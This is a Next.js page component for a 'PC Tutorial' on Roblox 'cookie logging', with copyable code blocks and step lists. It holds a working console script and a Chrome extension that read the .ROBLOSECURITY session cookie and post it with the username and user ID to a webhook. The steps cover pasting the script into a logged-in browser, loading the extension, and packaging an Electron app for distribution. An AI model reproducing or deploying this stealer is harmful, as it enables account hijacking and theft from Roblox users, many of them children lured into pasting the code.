"use client"

import { SectionWrapper } from "@/components/section-wrapper"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { ParticleSystem } from "@/components/particle-system"
import { ArrowLeft, Monitor, Copy, CheckCircle } from "lucide-react"
import Link from "next/link"
import { useState } from "react"

export default function PCPage() {
  const [copiedStep, setCopiedStep] = useState<number | null>(null)

  const copyToClipboard = (text: string, stepNumber: number) => {
    navigator.clipboard.writeText(text)
    setCopiedStep(stepNumber)
    setTimeout(() => setCopiedStep(null), 2000)
  }

  const pcCode = `// PC Cookie Logger
const logCookiePC = async () => {
  try {
    // Method 1: Browser Console
    const cookies = document.cookie.split(';');
    let roblosecurityCookie = '';
    
    for (let cookie of cookies) {
      const [name, value] = cookie.trim().split('=');
      if (name === '.ROBLOSECURITY') {
        roblosecurityCookie = value;
        break;
      }
    }
    
    if (!roblosecurityCookie) {
      console.log('No Roblox cookie found');
      return;
    }
    
    // Get user information
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': \`.ROBLOSECURITY=\${roblosecurityCookie}\`
      }
    });
    
    const userData = await userResponse.json();
    
    // Send to webhook
    const webhookPayload = {
      embeds: [{
        title: "🖥️ PC Cookie Logged",
        color: 0xff0000,
        fields: [
          {
            name: "Platform",
            value: "PC/Desktop",
            inline: true
          },
          {
            name: "Username",
            value: userData.name || "Unknown",
            inline: true
          },
          {
            name: "User ID",
            value: userData.id || "Unknown",
            inline: true
          },
          {
            name: "Cookie",
            value: \`\\\`\\\`\${roblosecurityCookie}\\\`\\\`\`,
            inline: false
          }
        ],
        timestamp: new Date().toISOString()
      }]
    };
    
    await fetch('YOUR_WEBHOOK_URL', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(webhookPayload)
    });
    
    console.log('Cookie logged successfully');
    
  } catch (error) {
    console.error('PC Cookie logging failed:', error);
  }
};

// Auto-execute
logCookiePC();`

  const browserExtensionCode = `// Browser Extension Method
// manifest.json
{
  "manifest_version": 3,
  "name": "PC Cookie Logger",
  "version": "1.0",
  "permissions": ["cookies", "activeTab"],
  "host_permissions": ["*://*.roblox.com/*"],
  "content_scripts": [{
    "matches": ["*://*.roblox.com/*"],
    "js": ["content.js"]
  }]
}

// content.js
chrome.cookies.getAll({domain: ".roblox.com"}, (cookies) => {
  const roblosecurityCookie = cookies.find(cookie => 
    cookie.name === '.ROBLOSECURITY'
  );
  
  if (roblosecurityCookie) {
    // Send to webhook
    fetch('YOUR_WEBHOOK_URL', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        platform: 'PC Browser Extension',
        cookie: roblosecurityCookie.value,
        timestamp: new Date().toISOString()
      })
    });
  }
});`

  const pcSteps = [
    {
      title: "Browser Console Method",
      description: "Using browser developer tools for cookie extraction",
      content: [
        "Open any modern browser (Chrome, Firefox, Edge)",
        "Navigate to roblox.com and ensure you're logged in",
        "Press F12 to open developer tools",
        "Go to the Console tab",
        "Paste the cookie logging script and press Enter",
      ],
    },
    {
      title: "Browser Extension",
      description: "Create a browser extension for automated logging",
      content: [
        "Create a new folder for your extension",
        "Add manifest.json with required permissions",
        "Create content.js with cookie extraction code",
        "Load the extension in developer mode",
        "Extension will automatically log cookies on Roblox sites",
      ],
    },
    {
      title: "Desktop Application",
      description: "Build a standalone desktop application",
      content: [
        "Use Electron or similar framework",
        "Embed a web browser component",
        "Inject JavaScript for cookie extraction",
        "Create a user interface for management",
        "Package as executable for distribution",
      ],
    },
  ]

  return (
    <div className="relative w-full min-h-screen overflow-hidden bg-gradient-to-br from-red-900 via-red-800 to-pink-900 flex flex-col items-center">
      {/* Bright overlay */}
      <div className="absolute inset-0 bg-gradient-to-br from-red-500/20 via-red-600/30 to-pink-500/20 z-0" />

      {/* Particle System */}
      <ParticleSystem />

      {/* Main content */}
      <div className="relative z-10 w-full max-w-4xl mx-auto py-8 px-4">
        {/* Header */}
        <div className="flex items-center gap-4 mb-8">
          <Link href="/">
            <Button variant="ghost" size="sm" className="text-red-200 hover:text-white hover:bg-red-500/20">
              <ArrowLeft className="w-4 h-4 mr-2" />
              Back to Home
            </Button>
          </Link>
        </div>

        <div className="text-center mb-12">
          <div className="flex items-center justify-center gap-3 mb-4">
            <Monitor className="w-12 h-12 text-red-300 animate-pulse" />
            <h1 className="text-5xl font-bold text-red-200 neon-text animate-neon-flicker">PC Tutorial</h1>
          </div>
          <p className="text-red-300 text-lg max-w-2xl mx-auto">
            Complete guide for PC/Desktop cookie logging and automation
          </p>
        </div>

        {/* Steps */}
        <div className="space-y-8">
          {pcSteps.map((step, index) => (
            <SectionWrapper key={index} className="nuclear-glow">
              <Card className="bg-red-500/20 border-red-400/30 shadow-lg shadow-red-500/20">
                <CardHeader>
                  <div className="flex items-center gap-3">
                    <Badge className="bg-red-600 text-white">Method {index + 1}</Badge>
                    <CardTitle className="text-red-200 text-2xl">{step.title}</CardTitle>
                  </div>
                  <CardDescription className="text-red-300">{step.description}</CardDescription>
                </CardHeader>
                <CardContent className="text-red-200 space-y-4">
                  <ul className="list-disc list-inside space-y-2">
                    {step.content.map((item, itemIndex) => (
                      <li key={itemIndex}>{item}</li>
                    ))}
                  </ul>
                </CardContent>
              </Card>
            </SectionWrapper>
          ))}

          {/* Main Code Section */}
          <SectionWrapper className="nuclear-glow">
            <Card className="bg-red-500/20 border-red-400/30 shadow-lg shadow-red-500/20">
              <CardHeader>
                <div className="flex items-center gap-3">
                  <Badge className="bg-red-600 text-white">Code</Badge>
                  <CardTitle className="text-red-200 text-2xl">PC Browser Console</CardTitle>
                </div>
                <CardDescription className="text-red-300">
                  JavaScript code for PC browser cookie logging
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="relative">
                  <pre className="bg-red-900/50 p-4 rounded-lg text-red-100 text-sm overflow-x-auto border border-red-400/30">
                    <code>{pcCode}</code>
                  </pre>
                  <Button
                    onClick={() => copyToClipboard(pcCode, 1)}
                    className="absolute top-2 right-2 bg-red-600 hover:bg-red-700 text-white"
                    size="sm"
                  >
                    {copiedStep === 1 ? <CheckCircle className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                  </Button>
                </div>
              </CardContent>
            </Card>
          </SectionWrapper>

          {/* Extension Code Section */}
          <SectionWrapper className="nuclear-glow">
            <Card className="bg-red-500/20 border-red-400/30 shadow-lg shadow-red-500/20">
              <CardHeader>
                <div className="flex items-center gap-3">
                  <Badge className="bg-red-600 text-white">Extension</Badge>
                  <CardTitle className="text-red-200 text-2xl">Browser Extension Code</CardTitle>
                </div>
                <CardDescription className="text-red-300">Complete browser extension implementation</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="relative">
                  <pre className="bg-red-900/50 p-4 rounded-lg text-red-100 text-sm overflow-x-auto border border-red-400/30">
                    <code>{browserExtensionCode}</code>
                  </pre>
                  <Button
                    onClick={() => copyToClipboard(browserExtensionCode, 2)}
                    className="absolute top-2 right-2 bg-red-600 hover:bg-red-700 text-white"
                    size="sm"
                  >
                    {copiedStep === 2 ? <CheckCircle className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                  </Button>
                </div>
              </CardContent>
            </Card>
          </SectionWrapper>
        </div>

        {/* Footer */}
        <div className="mt-12 text-center">
          <p className="text-red-300 text-sm">PC/Desktop implementation with multiple methods for cookie logging</p>
        </div>
      </div>
    </div>
  )
}
